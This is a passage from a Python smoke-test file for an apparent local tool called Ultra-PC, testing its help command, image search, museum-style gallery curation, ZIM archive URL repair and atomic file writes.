    for argv in (["help"], ["--help"], ["-h"], ["help", "img"], ["help", "fix"]):
        assert helpcmd.handle(argv) == 0, f"help {argv}"
    assert helpcmd.handle(["notacommand"]) is None
    # an unknown topic must not crash — it falls back to the topic list
    assert helpcmd.handle(["help", "zzz"]) == 0
    # every alias must resolve to a real section
    for target in helpcmd._ALIASES.values():
        assert any(s[0] == target for s in helpcmd.SECTIONS), target
    # help counts must match vault reality — stale numbers fail here
    from ultrapc import assets
    asec = next(s for s in helpcmd.SECTIONS if s[0] == "assets")
    text = " ".join(c + " " + d for c, d in asec[3]) + " ".join(asec[4])
    for n, what in ((len(assets.PROFILES), "profiles"),
                    (len(assets.PALETTES), "palettes"),
                    (len(assets.SHAPES), "shapes"),
                    (len(assets.STYLES), "styles"),
                    (len(assets.GRADIENTS), "gradients"),
                    (len(assets.TECHNIQUES), "techniques")):
        assert str(n) in text, f"help says wrong {what} count (now {n})"
    # every style must be named in the help detail
    for key in assets.STYLES:
        assert key in text, f"help style list missing {key}"


def test_imgsearch_prompt_ensemble():
    # the query ensemble must include the bare query plus caption templates
    from ultrapc import imgsearch
    variants = [t.format("cat") for t in imgsearch._PROMPT_TEMPLATES]
    assert "cat" in variants and "a photo of cat" in variants


def test_imgsearch_resolve_target():
    # the first CLI arg is a collection only if it matches a known index AND
    # something follows it — otherwise the whole thing is the free-text query
    from ultrapc import imgsearch
    names = {"photos", "screenshots"}
    assert imgsearch._resolve_target(["photos", "the", "moon"], names) == \
        ("photos", "the moon")
    assert imgsearch._resolve_target(["the", "moon"], names) == (None, "the moon")
    assert imgsearch._resolve_target(["map", "of", "italy"], names) == \
        (None, "map of italy")
    # a lone token that happens to match a name is still a query (empty query useless)
    assert imgsearch._resolve_target(["photos"], names) == (None, "photos")


def test_imgsearch_empty_query_guard():
    # a blank query, or a missing collection name, must short-circuit to []
    # without touching the model (no network / no CLIP load)
    from ultrapc import imgsearch
    assert imgsearch.search("nope", "   ") == []
    assert imgsearch.search("nope", "") == []
    assert imgsearch.search(None, "cat") == []      # no collection -> safe []
    assert imgsearch.similar(None, "x.png") == []    # no collection -> safe []


def test_gallery_helpers():
    # the archive's layout/plaque logic must hold without opening a window
    from ultrapc import gallery
    # catalog number: deterministic, museum-styled
    m = {"hash": "book/x.png"}
    assert gallery._catalog_no(m) == gallery._catalog_no(m)
    assert gallery._catalog_no(m).startswith("UA-") and \
        len(gallery._catalog_no(m)) == 9
    # Z-path: alternates sides with a centered beat, always a sane fraction
    xs = [gallery._zigzag_x(i) for i in range(10)]
    assert all(0.2 <= x <= 0.8 for x in xs)
    assert xs[0] != xs[1] and 0.5 in xs
    # mix plan: the giant collection is capped so small ones still appear
    plan = gallery._mix_plan({"wiki": 6_840_001, "pics": 3_000}, 100)
    assert plan["pics"] >= 10 and plan["wiki"] <= 90
    assert gallery._mix_plan({"empty": 0}, 50) == {}
    # plaque: three lines, long titles truncated, sources humanized
    t, mid, src = gallery._plaque_lines(
        {"file": "x" * 90, "abs": "http://k/x.png", "hash": "b/x.png"},
        (640, 480), "wikipedia_images")
    assert len(t) <= 52 and "640×480" in mid and src.startswith("Wikipedia")
    # the palette is vaulted: golden-archive style is the source of truth
    from ultrapc import assets
    assert "golden-archive" in assets.STYLES
    toks = assets.STYLES["golden-archive"]["tokens"]
    assert gallery.ARCH["gold"] == toks["accent"]
    assert gallery.ARCH["bg"] == toks["bg"]
    # the gallery is reachable from the interactive menu
    from ultrapc import imgsearch
    cat = imgsearch.register()
    assert any(t.key == "gallery" for t in cat.tools)
    # the hall exhibits ZIM archives only by default; personal folders need
    # to be named; folder-only setups still get a gallery
    infos = [{"name": "wiki", "source": "zim:w.zim"},
             {"name": "pics", "source": r"C:\pics"}]
    assert [i["name"] for i in gallery._exhibit_infos(infos, None)] == ["wiki"]
    assert [i["name"] for i in gallery._exhibit_infos(infos, "pics")] == ["pics"]
    assert gallery._exhibit_infos([infos[1]], None) == [infos[1]]


def test_gallery_curation():
    # the topic gate: clear allow-match passes; explicit/morbid material fails
    from ultrapc import gallery, imgsearch
    assert gallery._gate(0.26, 0.20)          # museum-grade
    assert not gallery._gate(0.19, 0.10)      # too vague — below amin
    assert not gallery._gate(0.25, 0.24)      # block score too close
    assert not gallery._gate(0.40, 0.31)      # strongly block-like: never
    # taste vector: toward ♥, away from ✕, normalized; empty -> None
    import numpy as np
    p = gallery._pref_vector([[1.0, 0.0]], [[0.0, 1.0]])
    assert abs(float(np.linalg.norm(p)) - 1.0) < 1e-5 and p[0] > 0 > p[1]
    assert gallery._pref_vector([], []) is None
    # topics: defaults present, file round-trips, remove works
    orig_root = imgsearch._root
    with tempfile.TemporaryDirectory() as td:
        imgsearch._root = lambda: Path(td)
        try:
            t = gallery.load_topics()
            assert t["allow"] == gallery.DEFAULT_ALLOW
            t["allow"].append("steam locomotives")
            gallery.save_topics(t)
            t2 = gallery.load_topics()
            assert "steam locomotives" in t2["allow"]
            assert t2["block"] == gallery.DEFAULT_BLOCK
        finally:
            imgsearch._root = orig_root
    # the block list must cover the material the user reported
    joined = " ".join(gallery.DEFAULT_BLOCK)
    for word in ("genital", "gore", "corpse", "nudity"):
        assert word in joined, f"block list lost: {word}"


def test_imgsearch_probe_target():
    # file targets: exists -> True, missing/blank -> False (no network involved)
    from ultrapc import imgsearch
    assert not imgsearch._probe_target("")
    assert not imgsearch._probe_target(r"C:\nope\missing_zz9.png")
    with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tf:
        real = tf.name
    try:
        assert imgsearch._probe_target(real)
    finally:
        with contextlib.suppress(OSError):
            os.unlink(real)


def test_zimimg_repair_urls():
    # a ZIM index built with the stale library book id must be rewritable to
    # the filename-stem id kiwix-serve actually uses (metadata only)
    import json as _json
    from ultrapc import imgsearch, zimimg
    orig_dir = imgsearch._dir
    with tempfile.TemporaryDirectory() as td:
        imgsearch._dir = lambda n: Path(td) / n
        try:
            d = Path(td) / "t"
            d.mkdir()
            rows = [{"file": "A", "abs": "http://127.0.0.1:4386/content/foo/a.png",
                     "hash": "foo/a.png"},
                    {"file": "B", "abs": "http://127.0.0.1:4386/content/foo/b.png",
                     "hash": "foo/b.png"}]
            with open(d / "meta.jsonl", "w", encoding="utf-8") as f:
                for r in rows:
                    f.write(_json.dumps(r) + "\n")
            (d / "info.json").write_text(_json.dumps(
                {"name": "t", "source": "zim:foo_maxi_2026-02.zim",
                 "book": "foo", "count": 2, "dim": 4}), encoding="utf-8")
            info = zimimg.repair_urls("t")
            assert info and info["book"] == "foo_maxi_2026-02"
            got = [_json.loads(l) for l in
                   (d / "meta.jsonl").read_text(encoding="utf-8").splitlines()]
            assert got[0]["abs"].endswith("/content/foo_maxi_2026-02/a.png")
            assert got[1]["hash"] == "foo_maxi_2026-02/b.png"
            assert (d / "meta_offsets.npy").exists()
            # idempotent: already-correct book id -> no-op
            assert zimimg.repair_urls("t") is None
            # non-ZIM collections are untouched
            (d / "info.json").write_text(_json.dumps(
                {"name": "t", "source": r"C:\pics", "count": 2}),
                encoding="utf-8")
            assert zimimg.repair_urls("t") is None
        finally:
            imgsearch._dir = orig_dir


def test_imgsearch_multi_select():
    from ultrapc import imgsearch
    # single number
    assert imgsearch._parse_selection("3", 10) == [2]
    # space-separated
    assert imgsearch._parse_selection("1 3 5", 10) == [0, 2, 4]
    # comma-separated
    assert imgsearch._parse_selection("1,3,5", 10) == [0, 2, 4]
    # range
    assert imgsearch._parse_selection("2-4", 10) == [1, 2, 3]
    # mixed
    assert imgsearch._parse_selection("1, 3-5, 8", 10) == [0, 2, 3, 4, 7]
    # out of bounds are dropped, no duplicates
    assert imgsearch._parse_selection("0 1 1 99", 5) == [0]
    # garbage returns empty
    assert imgsearch._parse_selection("abc", 10) == []
    # Enter (empty) handled by caller, but just in case
    assert imgsearch._parse_selection("", 10) == []


def test_imgsearch_dedup():
    # the same file surfacing from two collections must appear once (best score)
    from ultrapc import imgsearch
    hits = [
        {"abs": "/x/a.png", "file": "a.png", "score": 0.9, "collection": "one"},
        {"abs": "/y/b.png", "file": "b.png", "score": 0.8, "collection": "two"},
        {"abs": "/x/a.png", "file": "a.png", "score": 0.4, "collection": "two"},
    ]
    out = imgsearch._dedup(hits)
    assert [h["file"] for h in out] == ["a.png", "b.png"]
    assert out[0]["score"] == 0.9      # kept the higher-scored occurrence


def test_imgsearch_atomic_npy():
    # vectors.npy must be written atomically (no .tmp leftovers, round-trips)
    from ultrapc import imgsearch
    import numpy as np
    with tempfile.TemporaryDirectory() as dd:
        p = Path(dd) / "vectors.npy"
        arr = np.arange(12, dtype=np.float16).reshape(3, 4)
        imgsearch._save_npy_atomic(p, arr)
        back = np.load(p)
        assert back.shape == (3, 4) and back.dtype == np.float16
        assert np.array_equal(back, arr)
        assert not [f for f in Path(dd).iterdir() if ".tmp" in f.name]


def test_imgsearch_bad_image_is_none():
    # a non-image file must load as None (skipped), not raise
    try:
        from PIL import Image  # noqa: F401
    except ImportError:
        return
    from ultrapc import imgsearch
    with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tf:
        tf.write(b"this is not a real png")
        bad = tf.name
    try:
        assert imgsearch._load_image(Path(bad)) is None
    finally:
        with contextlib.suppress(OSError):
            os.unlink(bad)


def test_atomic_write():
    from ultrapc import core
    with tempfile.TemporaryDirectory() as d:
        p = Path(d) / "state.json"
        core.write_atomic(p, '{"ok": true}')
        assert p.read_text() == '{"ok": true}'
        # no temp siblings left behind after a successful write
        leftovers = [f.name for f in Path(d).iterdir() if ".tmp" in f.name]
        assert not leftovers, leftovers


def main() -> int:
    print("Ultra-PC smoke tests\n" + "-" * 40)
    for name, fn in sorted(globals().items()):
        if name.startswith("test_") and callable(fn):
            check(name[5:], fn)
    print("-" * 40)
    print(f"{_PASS} passed, {len(_FAIL)} failed")
    if _FAIL:
        print("\nFailures:")
        for name, tb in _FAIL:
            print(f"\n### {name}\n{tb}")
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
